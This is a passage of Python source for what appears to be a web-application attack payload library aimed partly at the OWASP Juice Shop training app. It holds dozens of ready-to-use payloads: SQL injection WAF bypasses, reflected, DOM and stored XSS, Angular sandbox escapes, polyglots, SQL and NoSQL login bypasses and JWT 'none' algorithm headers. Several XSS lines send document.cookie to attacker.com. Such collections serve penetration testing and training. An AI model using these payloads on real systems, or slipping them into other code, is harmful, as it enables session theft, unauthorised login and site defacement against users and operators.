            tags=["waf_bypass", "whitespace"],
        ))
        payloads.append(Payload(
            value="' /*!50000OR*/ 1=1--",
            description="MySQL version-specific comment for WAF bypass",
            detection_hint="WAF bypass: MySQL executes code inside versioned comment",
            sub_type="waf_bypass",
            db_specific="mysql",
            severity="high",
            waf_bypass=True,
            tags=["waf_bypass", "versioned_comment"],
        ))
        payloads.append(Payload(
            value="' UNION%23%0aSELECT 1,2,3--",
            description="URL-encoded # comment + newline for WAF bypass",
            detection_hint="WAF bypass: comment in middle of UNION SELECT",
            sub_type="waf_bypass",
            db_specific="mysql",
            severity="high",
            waf_bypass=True,
            tags=["waf_bypass", "encoding"],
        ))
        payloads.append(Payload(
            value="%27%20OR%201%3D1--",
            description="Fully URL-encoded SQL injection: ' OR 1=1--",
            detection_hint="WAF bypass: entire payload URL-encoded to avoid pattern match",
            sub_type="waf_bypass",
            db_specific="generic",
            severity="high",
            waf_bypass=True,
            tags=["waf_bypass", "url_encoding"],
        ))
        payloads.append(Payload(
            value="%2527%2520OR%25201%253D1--",
            description="Double URL-encoded SQL injection: ' OR 1=1--",
            detection_hint="WAF bypass: double encoding decoded by application but not WAF",
            sub_type="waf_bypass",
            db_specific="generic",
            severity="high",
            waf_bypass=True,
            tags=["waf_bypass", "double_encoding"],
        ))
        payloads.append(Payload(
            value="' UNION ALL SELECT NULL,NULL,NULL--",
            description="UNION ALL instead of UNION (some WAFs only block UNION SELECT)",
            detection_hint="WAF bypass: UNION ALL not in WAF signature",
            sub_type="waf_bypass",
            db_specific="generic",
            severity="high",
            waf_bypass=True,
            tags=["waf_bypass"],
        ))
        payloads.append(Payload(
            value="' aNd 1=1--",
            description="Mixed case AND for WAF bypass",
            detection_hint="WAF bypass: mixed case still interpreted by SQL engine",
            sub_type="waf_bypass",
            db_specific="generic",
            severity="high",
            waf_bypass=True,
            tags=["waf_bypass", "case_change"],
        ))
        payloads.append(Payload(
            value="'-IF(1=1,1,0)--",
            description="Inline IF without spaces for WAF bypass",
            detection_hint="WAF bypass: no spaces between operators",
            sub_type="waf_bypass",
            db_specific="mysql",
            severity="high",
            waf_bypass=True,
            tags=["waf_bypass"],
        ))

        return payloads

    # ================================================================== #
    #  XSS PAYLOADS (65+)
    # ================================================================== #
    def _build_xss_payloads(self) -> List[Payload]:
        payloads: List[Payload] = []

        # ============================================================ #
        #  Reflected XSS - Basic
        # ============================================================ #
        payloads.append(Payload(
            value="<script>alert('XSS')</script>",
            description="Basic script tag injection - simplest XSS test",
            detection_hint="Alert dialog pops up or <script> tag appears unencoded in DOM/response",
            sub_type="reflected",
            severity="high",
            tags=["basic", "script_tag"],
        ))
        payloads.append(Payload(
            value='<script>alert(document.cookie)</script>',
            description="Cookie stealing via script tag alert",
            detection_hint="Alert shows cookie content, or script tag in response body",
            sub_type="reflected",
            severity="critical",
            tags=["cookie_theft", "script_tag"],
        ))
        payloads.append(Payload(
            value='<script>alert(document.domain)</script>',
            description="Domain disclosure via XSS alert",
            detection_hint="Alert shows current domain, confirms script execution",
            sub_type="reflected",
            severity="high",
            tags=["basic", "script_tag"],
        ))
        payloads.append(Payload(
            value="<script>alert(String.fromCharCode(88,83,83))</script>",
            description="XSS via String.fromCharCode to bypass keyword-based filters",
            detection_hint="Alert shows 'XSS' text without 'XSS' string in payload",
            sub_type="reflected",
            severity="high",
            waf_bypass=True,
            tags=["filter_bypass", "char_code"],
        ))
        payloads.append(Payload(
            value='<ScRiPt>alert("XSS")</ScRiPt>',
            description="Mixed case script tag to bypass case-sensitive tag filters",
            detection_hint="Alert fires despite case-sensitive <script> blocking",
            sub_type="reflected",
            severity="high",
            waf_bypass=True,
            tags=["filter_bypass", "case_change"],
        ))
        payloads.append(Payload(
            value='<SCRIPT>alert("XSS")</SCRIPT>',
            description="All uppercase script tag",
            detection_hint="Alert fires when uppercase SCRIPT tag not filtered",
            sub_type="reflected",
            severity="high",
            waf_bypass=True,
            tags=["filter_bypass", "case_change"],
        ))

        # ============================================================ #
        #  Reflected XSS - Event Handlers
        # ============================================================ #
        payloads.append(Payload(
            value='<img src=x onerror=alert("XSS")>',
            description="Image error event handler XSS - fires when src fails to load",
            detection_hint="Alert triggers immediately on broken image load (src=x)",
            sub_type="reflected",
            severity="high",
            tags=["event_handler", "img"],
        ))
        payloads.append(Payload(
            value='<svg onload=alert("XSS")>',
            description="SVG onload event XSS - fires when SVG element is loaded",
            detection_hint="Alert triggers when SVG element is parsed by browser",
            sub_type="reflected",
            severity="high",
            tags=["event_handler", "svg"],
        ))
        payloads.append(Payload(
            value='<body onload=alert("XSS")>',
            description="Body onload event XSS - fires when page loads",
            detection_hint="Alert triggers on page load event",
            sub_type="reflected",
            severity="high",
            tags=["event_handler", "body"],
        ))
        payloads.append(Payload(
            value='<input onfocus=alert("XSS") autofocus>',
            description="Input autofocus event XSS - auto-triggers without user interaction",
            detection_hint="Alert fires automatically when input gets auto-focus",
            sub_type="reflected",
            severity="high",
            tags=["event_handler", "autofocus"],
        ))
        payloads.append(Payload(
            value='<marquee onstart=alert("XSS")>',
            description="Marquee onstart event XSS",
            detection_hint="Alert triggers when marquee animation starts",
            sub_type="reflected",
            severity="high",
            tags=["event_handler", "marquee"],
        ))
        payloads.append(Payload(
            value='<details open ontoggle=alert("XSS")>',
            description="Details element ontoggle event XSS - auto-triggers with open attribute",
            detection_hint="Alert fires when details element toggles open",
            sub_type="reflected",
            severity="high",
            tags=["event_handler", "details"],
        ))
        payloads.append(Payload(
            value='<video><source onerror=alert("XSS")>',
            description="Video source error event XSS",
            detection_hint="Alert triggers on missing video source error",
            sub_type="reflected",
            severity="high",
            tags=["event_handler", "video"],
        ))
        payloads.append(Payload(
            value='<div onmouseover=alert("XSS")>HOVER ME</div>',
            description="Mouse over event XSS - requires user hover interaction",
            detection_hint="Alert fires when user hovers over the injected div",
            sub_type="reflected",
            severity="medium",
            tags=["event_handler", "mouse"],
        ))
        payloads.append(Payload(
            value='<select onfocus=alert("XSS") autofocus>',
            description="Select element autofocus XSS",
            detection_hint="Alert fires on select element auto-focus",
            sub_type="reflected",
            severity="high",
            tags=["event_handler", "autofocus"],
        ))
        payloads.append(Payload(
            value='<textarea onfocus=alert("XSS") autofocus>',
            description="Textarea autofocus XSS",
            detection_hint="Alert fires on textarea auto-focus",
            sub_type="reflected",
            severity="high",
            tags=["event_handler", "autofocus"],
        ))
        payloads.append(Payload(
            value='<keygen onfocus=alert("XSS") autofocus>',
            description="Keygen element autofocus XSS (older browsers)",
            detection_hint="Alert fires on keygen auto-focus in compatible browsers",
            sub_type="reflected",
            severity="medium",
            tags=["event_handler", "autofocus"],
        ))
        payloads.append(Payload(
            value='<audio src=x onerror=alert("XSS")>',
            description="Audio error event XSS",
            detection_hint="Alert fires on audio source load failure",
            sub_type="reflected",
            severity="high",
            tags=["event_handler", "audio"],
        ))
        payloads.append(Payload(
            value='<object data=x onerror=alert("XSS")>',
            description="Object data error event XSS",
            detection_hint="Alert fires on object data load failure",
            sub_type="reflected",
            severity="high",
            tags=["event_handler", "object"],
        ))

        # ============================================================ #
        #  SVG/IMG Advanced
        # ============================================================ #
        payloads.append(Payload(
            value='<svg/onload=alert("XSS")>',
            description="SVG without space between tag and event - bypasses space-based filters",
            detection_hint="Alert fires. Slash acts as attribute separator in some parsers",
            sub_type="reflected",
            severity="high",
            waf_bypass=True,
            tags=["filter_bypass", "svg", "no_space"],
        ))
        payloads.append(Payload(
            value='<img src=x onerror=alert`XSS`>',
            description="Template literal backtick XSS - no parentheses needed",
            detection_hint="Alert fires using ES6 template literals instead of parentheses",
            sub_type="reflected",
            severity="high",
            waf_bypass=True,
            tags=["filter_bypass", "backtick"],
        ))
        payloads.append(Payload(
            value='<svg><script>alert&#40;"XSS"&#41;</script></svg>',
            description="SVG with HTML entity encoded parentheses in script",
            detection_hint="Alert fires through SVG script context with entity decoding",
            sub_type="reflected",
            severity="high",
            waf_bypass=True,
            tags=["filter_bypass", "html_entities", "svg"],
        ))
        payloads.append(Payload(
            value='<svg><animate onbegin=alert("XSS") attributeName=x dur=1s>',
            description="SVG animate element with onbegin event handler",
            detection_hint="Alert fires when SVG animation begins rendering",
            sub_type="reflected",
            severity="high",
            waf_bypass=True,
            tags=["filter_bypass", "svg", "animate"],
        ))
        payloads.append(Payload(
            value='<svg><set onbegin=alert("XSS") attributename=x>',
            description="SVG set element with onbegin event",
            detection_hint="Alert fires through SVG set element",
            sub_type="reflected",
            severity="high",
            waf_bypass=True,
            tags=["filter_bypass", "svg"],
        ))

        # ============================================================ #
        #  DOM-Based XSS
        # ============================================================ #
        payloads.append(Payload(
            value='"><script>alert(document.domain)</script>',
            description="Break out of double-quoted attribute and inject script tag",
            detection_hint="Closes attribute, injects script. Check DOM for unescaped output",
            sub_type="dom_based",
            severity="high",
            tags=["attribute_breakout", "double_quote"],
        ))
        payloads.append(Payload(
            value="'><script>alert(document.domain)</script>",
            description="Break out of single-quoted attribute and inject script",
            detection_hint="Closes single-quoted attribute, injects script tag",
            sub_type="dom_based",
            severity="high",
            tags=["attribute_breakout", "single_quote"],
        ))
        payloads.append(Payload(
            value="javascript:alert('XSS')",
            description="JavaScript protocol handler for href/src/action attributes",
            detection_hint="Alert fires when link clicked or element loaded with javascript: URL",
            sub_type="dom_based",
            severity="high",
            tags=["protocol_handler"],
        ))
        payloads.append(Payload(
            value='"-alert(1)-"',
            description="Break out of JS double-quoted string context with subtraction operator",
            detection_hint="Alert executes between string termination and continuation",
            sub_type="dom_based",
            severity="high",
            tags=["js_context", "string_breakout"],
        ))
        payloads.append(Payload(
            value="';alert(1)//",
            description="Break out of JS single-quoted string, execute alert, comment rest",
            detection_hint="Alert fires from injected JavaScript in string context",
            sub_type="dom_based",
            severity="high",
            tags=["js_context", "string_breakout"],
        ))
        payloads.append(Payload(
            value='";alert(1)//',
            description="Break out of JS double-quoted string, execute alert, comment rest",
            detection_hint="Alert fires in double-quoted JavaScript string context",
            sub_type="dom_based",
            severity="high",
            tags=["js_context", "string_breakout"],
        ))
        payloads.append(Payload(
            value='#<script>alert("XSS")</script>',
            description="Hash-based DOM XSS via URL fragment identifier",
            detection_hint="Script in URL hash gets processed by client-side JavaScript (location.hash)",
            sub_type="dom_based",
            severity="high",
            tags=["fragment", "client_side"],
        ))
        payloads.append(Payload(
            value='<img src=x onerror="document.location=\'http://attacker.com/cookie?\'+document.cookie">',
            description="Cookie exfiltration via image error handler redirecting to attacker",
            detection_hint="Network request to attacker domain containing cookie values",
            sub_type="dom_based",
            severity="critical",
            tags=["cookie_theft", "exfiltration"],
        ))
        payloads.append(Payload(
            value="</script><script>alert('XSS')</script>",
            description="Close existing script tag and inject new one",
            detection_hint="Breaks out of existing <script> block, starts new one",
            sub_type="dom_based",
            severity="high",
            tags=["script_breakout"],
        ))

        # ============================================================ #
        #  Stored XSS
        # ============================================================ #
        payloads.append(Payload(
            value='<script>fetch("http://attacker.com/?c="+document.cookie)</script>',
            description="Stored XSS with cookie exfiltration via fetch API",
            detection_hint="Every user viewing the page sends cookies to attacker server",
            sub_type="stored",
            severity="critical",
            tags=["cookie_theft", "fetch", "persistent"],
        ))
        payloads.append(Payload(
            value='<script>new Image().src="http://attacker.com/?c="+document.cookie</script>',
            description="Stored XSS cookie steal via Image object (no CORS restrictions)",
            detection_hint="Image request to attacker with cookies, bypasses CORS",
            sub_type="stored",
            severity="critical",
            tags=["cookie_theft", "image", "persistent"],
        ))
        payloads.append(Payload(
            value='<img src=x onerror=this.src="http://attacker.com/?c="+document.cookie>',
            description="Stored XSS cookie steal via recursive img src reassignment",
            detection_hint="Continuous requests to attacker endpoint on page load",
            sub_type="stored",
            severity="critical",
            tags=["cookie_theft", "persistent"],
        ))
        payloads.append(Payload(
            value='<script>document.write("<img src=http://attacker.com/?c="+document.cookie+">")</script>',
            description="Stored XSS using document.write for cookie exfiltration",
            detection_hint="DOM modification injects image tag with cookie data",
            sub_type="stored",
            severity="critical",
            tags=["cookie_theft", "persistent"],
        ))

        # ============================================================ #
        #  Angular-Specific Template Injection (15+ for Juice Shop)
        # ============================================================ #
        payloads.append(Payload(
            value="{{constructor.constructor('alert(1)')()}}",
            description="Angular template injection via constructor chain - primary Juice Shop payload",
            detection_hint="Alert fires in Angular application context. Works on Angular 1.x",
            sub_type="angular",
            framework_specific="angular",
            severity="critical",
            juice_shop=True,
            tags=["template_injection", "constructor_chain"],
        ))
        payloads.append(Payload(
            value="{{$on.constructor('alert(1)')()}}",
            description="Angular $on scope method constructor injection",
            detection_hint="Alert fires through Angular scope $on method",
            sub_type="angular",
            framework_specific="angular",
            severity="critical",
            juice_shop=True,
            tags=["template_injection", "scope_method"],
        ))
        payloads.append(Payload(
            value="{{constructor.constructor('return this')().alert(1)}}",
            description="Angular sandbox escape: constructor returns window object, calls alert",
            detection_hint="Alert fires by accessing window through constructor chain",
            sub_type="angular",
            framework_specific="angular",
            severity="critical",
            juice_shop=True,
            tags=["sandbox_escape", "window_access"],
        ))
        payloads.append(Payload(
            value="{{{'a'].__proto__.b=['alert(1)']}}",
            description="Angular prototype pollution via template expression",
            detection_hint="Prototype pollution triggers alert through polluted property",
            sub_type="angular",
            framework_specific="angular",
            severity="critical",
            tags=["prototype_pollution", "sandbox_escape"],
        ))
        payloads.append(Payload(
            value="{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor)}}",
            description="Angular advanced sandbox escape via Function.prototype manipulation and sort",
            detection_hint="Alert fires through array sort with manipulated toString constructor",
            sub_type="angular",
            framework_specific="angular",
            severity="critical",
            tags=["sandbox_escape", "advanced"],
        ))
        payloads.append(Payload(
            value="{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)')}}",
            description="Angular sandbox escape via charAt prototype override and $eval",
            detection_hint="Alert fires through prototype manipulation and scope eval",
            sub_type="angular",
            framework_specific="angular",
            severity="critical",
            tags=["sandbox_escape", "prototype_override"],
        ))
        payloads.append(Payload(
            value="{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}",
            description="Angular 1.5+ sandbox escape using getOwnPropertyDescriptor",
            detection_hint="Alert fires in Angular 1.5+ applications through property descriptor",
            sub_type="angular",
            framework_specific="angular",
            severity="critical",
            tags=["sandbox_escape", "angular_1.5"],
        ))
        payloads.append(Payload(
            value="{{[].pop.constructor&#40'alert\\x281\\x29'&#41&#40&#41}}",
            description="Angular injection with HTML entity encoded parentheses for WAF bypass",
            detection_hint="Alert fires through HTML entity decoding in Angular template",
            sub_type="angular",
            framework_specific="angular",
            severity="critical",
            waf_bypass=True,
            tags=["sandbox_escape", "html_entity_bypass"],
        ))
        payloads.append(Payload(
            value="<div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
            description="Self-bootstrapping Angular injection with ng-app directive",
            detection_hint="Alert fires when Angular processes the ng-app div",
            sub_type="angular",
            framework_specific="angular",
            severity="critical",
            juice_shop=True,
            tags=["template_injection", "ng_app"],
        ))
        payloads.append(Payload(
            value="{{1+1}}",
            description="Angular template injection probe: should render '2' if templates processed",
            detection_hint="Output shows '2' instead of literal '{{1+1}}' = template injection confirmed",
            sub_type="angular",
            framework_specific="angular",
            severity="low",
            juice_shop=True,
            tags=["probe", "detection"],
        ))
        payloads.append(Payload(
            value="{{7*7}}",
            description="Angular/SSTI numeric multiplication probe (should render 49)",
            detection_hint="Output shows '49' instead of '{{7*7}}' = template engine processing input",
            sub_type="angular",
            framework_specific="angular",
            severity="low",
            juice_shop=True,
            tags=["probe", "detection"],
        ))
        payloads.append(Payload(
            value="{{7*'7'}}",
            description="Template injection type detection: Angular renders 49, Jinja2 renders 7777777",
            detection_hint="49 = Angular/Python eval, 7777777 = Jinja2, error = no injection",
            sub_type="angular",
            framework_specific="angular",
            severity="low",
            tags=["probe", "fingerprint"],
        ))
        payloads.append(Payload(
            value="{{alert(1)}}",
            description="Simple Angular template alert for very old Angular versions (pre-sandbox)",
            detection_hint="Alert fires directly from template expression in Angular < 1.2",
            sub_type="angular",
            framework_specific="angular",
            severity="high",
            tags=["template_injection", "old_angular"],
        ))
        payloads.append(Payload(
            value="<script>angular.element(document).scope().$eval('alert(1)')</script>",
            description="Angular scope access via DOM and $eval for code execution",
            detection_hint="Alert fires through Angular scope evaluation from script context",
            sub_type="angular",
            framework_specific="angular",
            severity="critical",
            tags=["scope_eval", "dom_access"],
        ))
        payloads.append(Payload(
            value="{{constructor.constructor('return fetch(`http://attacker.com/?c=`+document.cookie)')()}}",
            description="Angular template injection with cookie exfiltration via fetch",
            detection_hint="Cookie data sent to attacker server through Angular template",
            sub_type="angular",
            framework_specific="angular",
            severity="critical",
            juice_shop=True,
            tags=["exfiltration", "cookie_theft"],
        ))
        payloads.append(Payload(
            value="{{constructor.constructor('return document.cookie')()}}",
            description="Angular template injection: read cookies without network request",
            detection_hint="Cookie values rendered in page output",
            sub_type="angular",
            framework_specific="angular",
            severity="high",
            juice_shop=True,
            tags=["cookie_read"],
        ))
        payloads.append(Payload(
            value="<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>",
            description="Angular CSP-compatible template injection",
            detection_hint="Alert fires even with Content-Security-Policy active",
            sub_type="angular",
            framework_specific="angular",
            severity="critical",
            tags=["csp_bypass", "template_injection"],
        ))
        payloads.append(Payload(
            value="{{constructor.constructor('document.body.innerHTML=\"<h1>DEFACED</h1>\"')()}}",
            description="Angular template injection for page defacement (PoC)",
            detection_hint="Page content replaced with DEFACED heading",
            sub_type="angular",
            framework_specific="angular",
            severity="high",
            tags=["defacement", "poc"],
        ))

        # ============================================================ #
        #  iframe-Based XSS
        # ============================================================ #
        payloads.append(Payload(
            value='<iframe src="javascript:alert(`xss`)">',
            description="iframe with javascript: protocol URL using backticks",
            detection_hint="Alert fires within iframe context using template literal",
            sub_type="iframe",
            severity="high",
            juice_shop=True,
            tags=["iframe", "protocol_handler"],
        ))
        payloads.append(Payload(
            value='<iframe srcdoc="<script>alert(1)</script>">',
            description="iframe srcdoc attribute with embedded script",
            detection_hint="Script executes within iframe srcdoc HTML content",
            sub_type="iframe",
            severity="high",
            tags=["iframe", "srcdoc"],
        ))
        payloads.append(Payload(
            value='<iframe src="data:text/html,<script>alert(1)</script>">',
            description="iframe with data: URI containing script",
            detection_hint="Alert from data URI HTML loaded in iframe",
            sub_type="iframe",
            severity="high",
            tags=["iframe", "data_uri"],
        ))
        payloads.append(Payload(
            value='<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
            description="iframe with base64-encoded data URI (encodes <script>alert(1)</script>)",
            detection_hint="Base64 decoded and executed in iframe context",
            sub_type="iframe",
            severity="high",
            waf_bypass=True,
            tags=["iframe", "base64", "data_uri"],
        ))
        payloads.append(Payload(
            value='<iframe onload=alert("XSS")>',
            description="iframe onload event handler XSS",
            detection_hint="Alert fires when empty iframe finishes loading",
            sub_type="iframe",
            severity="high",
            tags=["iframe", "event_handler"],
        ))

        # ============================================================ #
        #  Polyglot XSS Payloads
        # ============================================================ #
        payloads.append(Payload(
            value="jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
            description="Ultimate polyglot XSS: works in multiple injection contexts simultaneously",
            detection_hint="Alert fires regardless of injection context (attribute, script, tag, etc.)",
            sub_type="polyglot",
            severity="critical",
            waf_bypass=True,
            tags=["polyglot", "multi_context"],
        ))
        payloads.append(Payload(
            value='"><img src=x onerror=alert(1)>',
            description="Attribute breakout polyglot: close double-quote attribute, inject img",
            detection_hint="Closes any double-quoted attribute and injects img error handler",
            sub_type="polyglot",
            severity="high",
            tags=["polyglot", "attribute_breakout"],
        ))
        payloads.append(Payload(
            value="'><script>alert(1)</script>",
            description="Single-quote attribute breakout with script injection",
            detection_hint="Closes single-quoted attribute and injects script tag",
            sub_type="polyglot",
            severity="high",
            tags=["polyglot", "attribute_breakout"],
        ))
        payloads.append(Payload(
            value='"><svg onload=alert(1)>',
            description="Attribute breakout with SVG onload",
            detection_hint="Closes attribute, SVG triggers alert on load",
            sub_type="polyglot",
            severity="high",
            tags=["polyglot", "attribute_breakout", "svg"],
        ))

        # ============================================================ #
        #  Filter Bypass Variants
        # ============================================================ #
        payloads.append(Payload(
            value='<scr<script>ipt>alert("XSS")</scr</script>ipt>',
            description="Nested/recursive script tag: survives single-pass tag removal filter",
            detection_hint="After filter removes inner <script>, outer tags form valid <script>",
            sub_type="filter_bypass",
            severity="high",
            waf_bypass=True,
            tags=["filter_bypass", "nested_tag"],
        ))
        payloads.append(Payload(
            value='%3Cscript%3Ealert(1)%3C/script%3E',
            description="URL-encoded <script>alert(1)</script>",
            detection_hint="Server decodes URL encoding, renders script tag",
            sub_type="filter_bypass",
            severity="high",
            waf_bypass=True,
            tags=["filter_bypass", "url_encoding"],
        ))
        payloads.append(Payload(
            value='%253Cscript%253Ealert(1)%253C/script%253E',
            description="Double URL-encoded script tag",
            detection_hint="Application double-decodes, WAF only single-decodes",
            sub_type="filter_bypass",
            severity="high",
            waf_bypass=True,
            tags=["filter_bypass", "double_encoding"],
        ))
        payloads.append(Payload(
            value='<script>eval(atob("YWxlcnQoMSk="))</script>',
            description="Base64-encoded alert(1) executed via eval + atob decode",
            detection_hint="Alert fires from decoded base64 string, 'alert' keyword hidden",
            sub_type="filter_bypass",
            severity="high",
            waf_bypass=True,
            tags=["filter_bypass", "base64", "eval"],
        ))
        payloads.append(Payload(
            value="<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>",
            description="Unicode escaped 'alert' function name",
            detection_hint="JS engine decodes unicode escapes, executes alert()",
            sub_type="filter_bypass",
            severity="high",
            waf_bypass=True,
            tags=["filter_bypass", "unicode"],
        ))
        payloads.append(Payload(
            value='<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">click</a>',
            description="HTML hex entity encoded 'javascript:' protocol",
            detection_hint="Browser decodes HTML entities, executes javascript: protocol on click",
            sub_type="filter_bypass",
            severity="high",
            waf_bypass=True,
            tags=["filter_bypass", "html_entity", "hex"],
        ))
        payloads.append(Payload(
            value='<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>',
            description="HTML decimal entity encoded 'javascript:' protocol",
            detection_hint="Browser decodes decimal entities, executes javascript: on click",
            sub_type="filter_bypass",
            severity="high",
            waf_bypass=True,
            tags=["filter_bypass", "html_entity", "decimal"],
        ))
        payloads.append(Payload(
            value="<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
            description="MathML context confusion: browser parses math/table/style differently",
            detection_hint="Alert fires through browser parser confusion with MathML elements",
            sub_type="filter_bypass",
            severity="high",
            waf_bypass=True,
            tags=["filter_bypass", "mathml", "parser_confusion"],
        ))
        payloads.append(Payload(
            value='<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
            description="HTML entity encoded event handler value",
            detection_hint="Browser decodes HTML entities in attribute value, executes alert",
            sub_type="filter_bypass",
            severity="high",
            waf_bypass=True,
            tags=["filter_bypass", "html_entity"],
        ))
        payloads.append(Payload(
            value="<img src=x onerror=window['al'+'ert'](1)>",
            description="String concatenation to build 'alert' at runtime",
            detection_hint="'alert' keyword split across strings, reassembled by JS engine",
            sub_type="filter_bypass",
            severity="high",
            waf_bypass=True,
            tags=["filter_bypass", "string_concat"],
        ))
        payloads.append(Payload(
            value="<img src=x onerror=top['al'+'ert'](1)>",
            description="Window.top bracket notation with string concat for alert",
            detection_hint="Accesses alert via top object with concatenated property name",
            sub_type="filter_bypass",
            severity="high",
            waf_bypass=True,
            tags=["filter_bypass", "string_concat", "top"],
        ))
        payloads.append(Payload(
            value="<img src=x onerror=self[atob('YWxlcnQ=')](1)>",
            description="Base64 decoded function name via self[] bracket notation",
            detection_hint="'alert' decoded from base64, called via bracket notation on self",
            sub_type="filter_bypass",
            severity="high",
            waf_bypass=True,
            tags=["filter_bypass", "base64", "bracket_notation"],
        ))

        return payloads

    # ================================================================== #
    #  AUTHENTICATION BYPASS PAYLOADS (35+)
    # ================================================================== #
    def _build_auth_bypass_payloads(self) -> List[Payload]:
        payloads: List[Payload] = []

        # ============================================================ #
        #  SQL Injection Login Bypass
        # ============================================================ #
        payloads.append(Payload(
            value="' OR 1=1--",
            description="Classic SQL injection login bypass - OR tautology with comment",
            detection_hint="Login succeeds without valid credentials, typically as first user",
            sub_type="sqli_login",
            severity="critical",
            juice_shop=True,
            tags=["login_bypass", "sqli"],
        ))
        payloads.append(Payload(
            value="admin'--",
            description="Login as admin by commenting out password check in WHERE clause",
            detection_hint="Login succeeds as admin account without knowing password",
            sub_type="sqli_login",
            severity="critical",
            juice_shop=True,
            tags=["login_bypass", "sqli", "admin"],
        ))
        payloads.append(Payload(
            value="' OR 1=1#",
            description="MySQL-style hash comment login bypass",
            detection_hint="Login succeeds, returns first user from database",
            sub_type="sqli_login",
            severity="critical",
            tags=["login_bypass", "sqli", "mysql"],
        ))
        payloads.append(Payload(
            value="admin' OR '1'='1",
            description="Admin login with string tautology, self-closing quotes",
            detection_hint="Login succeeds as admin with always-true condition",
            sub_type="sqli_login",
            severity="critical",
            tags=["login_bypass", "sqli"],
        ))
        payloads.append(Payload(
            value="' OR ''='",
            description="Empty string equality login bypass",
            detection_hint="Login succeeds with empty string tautology comparison",
            sub_type="sqli_login",
            severity="critical",
            tags=["login_bypass", "sqli"],
        ))
        payloads.append(Payload(
            value="' OR 1=1 LIMIT 1--",
            description="Login bypass returning only first user to avoid multi-row errors",
            detection_hint="Login succeeds as first user, no error from multiple rows",
            sub_type="sqli_login",
            severity="critical",
            tags=["login_bypass", "sqli"],
        ))
        payloads.append(Payload(
            value="') OR 1=1--",
            description="Parenthesis-wrapped query login bypass (queries using WHERE (col='val'))",
            detection_hint="Login succeeds when query wraps conditions in parentheses",
            sub_type="sqli_login",
            severity="critical",
            tags=["login_bypass", "sqli", "parenthesis"],
        ))
        payloads.append(Payload(
            value="')) OR 1=1--",
            description="Double parenthesis login bypass",
            detection_hint="Login succeeds with double-nested parenthesis queries",
            sub_type="sqli_login",
            severity="critical",
            tags=["login_bypass", "sqli", "parenthesis"],
        ))
        payloads.append(Payload(
            value="' OR 1=1 OR '1'='1",
            description="Multiple OR tautologies for maximum bypass coverage",
            detection_hint="Login succeeds through redundant OR conditions",
            sub_type="sqli_login",
            severity="critical",
            tags=["login_bypass", "sqli"],
        ))
        payloads.append(Payload(
            value="admin' OR 1=1--",
            description="Admin username with OR tautology and comment",
            detection_hint="Login as admin with tautology bypass",
            sub_type="sqli_login",
            severity="critical",
            juice_shop=True,
            tags=["login_bypass", "sqli", "admin"],
        ))
        payloads.append(Payload(
            value="' OR 'x'='x",
            description="Arbitrary string tautology without numeric comparison",
            detection_hint="Login succeeds with string equality tautology",
            sub_type="sqli_login",
            severity="critical",
            tags=["login_bypass", "sqli"],
        ))
        payloads.append(Payload(
            value="admin'/*",
            description="Admin login with block comment instead of line comment",
            detection_hint="Login as admin using /* to comment out password check",
            sub_type="sqli_login",
            severity="critical",
            tags=["login_bypass", "sqli", "admin"],
        ))

        # ============================================================ #
        #  NoSQL Injection Login Bypass
        # ============================================================ #
        payloads.append(Payload(
            value='{"$gt": ""}',
            description="NoSQL $gt empty string: matches any value greater than empty string",
            detection_hint="Login succeeds because every non-empty password is > empty string",
            sub_type="nosqli_login",
            severity="critical",
            tags=["login_bypass", "nosqli", "mongodb"],
        ))
        payloads.append(Payload(
            value='{"$ne": ""}',
            description="NoSQL $ne empty: matches any non-empty value",
            detection_hint="Login succeeds for any user with non-empty password",
            sub_type="nosqli_login",
            severity="critical",
            tags=["login_bypass", "nosqli", "mongodb"],
        ))
        payloads.append(Payload(
            value='{"$ne": null}',
            description="NoSQL $ne null: matches any non-null value",
            detection_hint="Login succeeds for any user with non-null credential field",
            sub_type="nosqli_login",
            severity="critical",
            tags=["login_bypass", "nosqli", "mongodb"],
        ))
        payloads.append(Payload(
            value='{"$regex": ".*"}',
            description="NoSQL $regex match-all: matches any string via regex",
            detection_hint="Login succeeds because regex .* matches everything",
            sub_type="nosqli_login",
            severity="critical",
            tags=["login_bypass", "nosqli", "mongodb"],
        ))
        payloads.append(Payload(
            value='{"$exists": true}',
            description="NoSQL $exists: matches if the field exists in document",
            detection_hint="Login succeeds for any document where password field exists",
            sub_type="nosqli_login",
            severity="critical",
            tags=["login_bypass", "nosqli", "mongodb"],
        ))
        payloads.append(Payload(
            value='{"$gt": "", "$lt": "~"}',
            description="NoSQL range bypass: matches any value between empty and tilde",
            detection_hint="Range covers virtually all printable ASCII strings",
            sub_type="nosqli_login",
            severity="critical",
            tags=["login_bypass", "nosqli", "mongodb"],
        ))

        # ============================================================ #
        #  JWT Authentication Bypass
        # ============================================================ #
        payloads.append(Payload(
            value='{"alg":"none","typ":"JWT"}',
            description="JWT 'none' algorithm: removes signature verification entirely",
            detection_hint="Server accepts JWT token without valid signature",
            sub_type="jwt",
            severity="critical",
            tags=["jwt", "none_algorithm"],
        ))
        payloads.append(Payload(
            value='{"alg":"None","typ":"JWT"}',
            description="JWT 'None' algorithm (capital N): case-sensitive bypass",
            detection_hint="Server accepts token with capitalized None algorithm",
            sub_type="jwt",
            severity="critical",
            tags=["jwt", "none_algorithm", "case_bypass"],
        ))
        payloads.append(Payload(
            value='{"alg":"NONE","typ":"JWT"}',
            description="JWT 'NONE' algorithm (all uppercase): case-sensitive bypass",
            detection_hint="Server accepts token with all-caps NONE algorithm",
